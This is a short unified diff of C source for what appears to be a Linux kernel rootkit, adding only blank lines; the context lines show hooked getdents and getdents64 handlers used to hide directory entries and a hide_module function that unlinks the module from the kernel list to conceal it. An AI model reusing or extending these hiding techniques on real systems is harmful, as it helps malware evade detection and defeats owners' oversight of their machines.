@@ -107,6 +107,7 @@ asmlinkage int intercepted_getdents(unsigned int fd, struct linux_dirent __user 
     struct linux_dirent *kdirp = kmalloc(ret, GFP_KERNEL);
     if (kdirp == NULL)
         return ret;
+    
     if (copy_from_user(kdirp, dirp, ret) != 0) {
         kfree(kdirp);
         return ret;
@@ -151,6 +152,7 @@ asmlinkage int intercepted_getdents64(unsigned int fd, struct linux_dirent64 __u
     struct linux_dirent64 *kdirp = kmalloc(ret, GFP_KERNEL);
     if (kdirp == NULL)
         return ret;
+    
     if (copy_from_user(kdirp, dirp, ret) != 0) {
         kfree(kdirp);
         return ret;
@@ -188,6 +190,7 @@ void hide_module(void)
     if (!module_hidden) {
         prev_mod = THIS_MODULE->list.prev;
         list_del(&THIS_MODULE->list);
+        
         kfree(THIS_MODULE->sect_attrs);
         THIS_MODULE->sect_attrs = NULL;
         module_hidden = true;
